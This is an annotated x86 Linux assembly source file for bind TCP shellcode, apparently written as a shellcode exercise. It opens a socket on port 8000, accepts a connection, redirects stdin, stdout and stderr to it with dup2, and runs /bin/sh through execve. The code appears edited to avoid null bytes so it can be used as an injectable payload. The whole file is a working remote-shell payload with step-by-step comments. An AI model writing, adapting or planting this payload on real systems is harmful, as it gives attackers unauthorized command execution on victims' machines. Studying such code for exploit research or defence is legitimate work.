; Bind IP/TCP Shell
; Author: l0wlevel
; Version 2

global _start			

section .text
_start:
	
	; Create SOCKETCALL (0x66) --> /usr/include/i386-linux-gnu/asm/unistd_32.h (102)

	; Pass arguments to the stack
	
	xor eax, eax	; VERSION2
	push eax		; VERSION2
	
	push 0X1		; Push the type to the stack (SOCK_STREAM=1)
	push 0X2		; Push the domain to the stack (AF_INET=2)

	xor eax, eax	; XOR eax register to clean it (all 0s)
	mov al, 0x66	; Move 0x66 to AL (EAX 8bits register) --> Systemcall 0x66
	xor ebx, ebx	; XOR ebx register to clean it (all 0s) 
	mov bl, 1		; Move 1 to BL (EBX 8bits register) --> Flag 1 to create socket
	mov ecx, esp	; Move the pointer of the stack to the ECX register
	int 0x80		; Interruption
	mov edx, eax 	; Store return value in EDX

	; Call SOCKETCALL for bind()
	
	xor eax, eax		; VERSION2
	push eax			; VERSION2

	push word 0x401F	; Port 8000 in reverse order to the stack (LIFO)
	push word 2			; Argument AF_INET 
	mov ecx, esp		; Move the pointer of the stack to the ECX register
	push 16				; Length of the struct sockaddr
	push ecx			; Push to the stack pointer to arguments
	push edx			; Push to the stack pointer to socket created
	mov al, 0x66		; Socketcall
	mov bl, 2			; Move 2 to BL --> Flag 2 to bind socket
	mov ecx, esp		; Move stack pointer to ECX
	int 0x80			; Interruption

	; Call SOCKETCALL for listen() --> listen() have two arguments (man listen)

	push byte 1		; backlog argument, maximum length of pending connections
	push edx		; sockfd, the file descriptor that refers to the socket
	mov al, 0x66	; System call
	mov bl, 4		; Move 4 to BL --> Flag 4 to listen in a socket
	mov ecx, esp	; Move stack pointer to ECX
	int 0x80		; Interruption
	
	; Call SOCKETCALL for accept() --> accept() have three arguments (man accept)

	xor eax, eax	; VERSION2
	push eax		; VERSION2
	push eax		; VERSION2
	push edx		; sockfd, the file descriptor that refers the socket
	mov al, 0x66	; System call
	mov bl, 5		; Move 5 to BL --> Flag 5 to accept conecctions
	mov ecx, esp	; Move stack pointer to ECX
	int 0x80		; Interruption
	mov ecx, edx	; Save socket in ECX register
	mov edx, eax	; Save client socket in EDX

	; Assign stdin, stdout, stedrr to a new socket using dup2 --> systemcall 0x3f 

	mov ebx, edx 	; Save client socket into EBX
	dupwhile:
	mov al, 0x3f	; Systemcall 0x3f, dup2
	int 0x80		; Interruption
	dec ecx			; Decrease old file descriptor
	jns dupwhile	; Jump to dupwhile if the ECX >=0
	

	; Push the first null dword
    xor eax, eax	; XOR eax register
    push eax		; Push the null dword to the stack

    ; Push //bin/sh in reverse order to the stack (8 bytes)

    push 0x68732f2f	; Push hs// to the stack
    push 0x6e69622f	; Push nib/ to the stack
        
    mov ebx, esp	; Move pointer stack address to ebx

    push eax		; Push null dword
    mov edx, esp	; Move pointer stack to edx

    push ebx		; Push the arguments address
    mov ecx, esp	; Move pointer stack address to ecx

    mov al, 11		; Systemcall of execve (unistd_32.h)
    int 0x80		; Interruption

